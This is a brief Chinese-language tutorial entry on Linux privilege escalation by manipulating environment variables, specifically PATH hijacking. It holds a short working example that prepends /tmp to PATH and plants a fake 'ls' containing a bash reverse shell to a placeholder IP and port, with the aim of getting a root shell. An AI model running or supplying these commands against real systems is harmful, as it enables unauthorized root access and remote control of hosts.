## 原理

Linux系统中的许多程序和脚本在执行时会读取环境变量，这些变量可能会影响程序的行为。如果攻击者可以操纵这些变量，可能会达成一些目的，如执行恶意代码，替换合法的程序等。



## 方法



### PATH劫持

#### 原理

当执行命令时，Shell会根据$PATH环境变量中列出来的路径来搜索可执行文件。如果攻击这可以在$PATH中放入恶意程序的路径（如在/tmp目录下创建一个可执行文件），系统首先会执行恶意程序，而不是合法程序，从而获得更高的权限



#### 示例

```
export PATH=/tmp:$PATH  # 将/tmp放在PATH最前面  
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<ip>/<port> 0>&1' > /tmp/ls  
chmod +x /tmp/ls  
ls # 此时ls命令将执行攻击者的代码  
```

将/tmp目录下的ls设置为弹shell脚本

当root用户自动调用ls脚本的话，shell会检查$PATH环境变量中的路径，由于/tmp目录在PATH最前面，因此会优先执行恶意程序ls命令而非正常命令，即可以获取到root的shell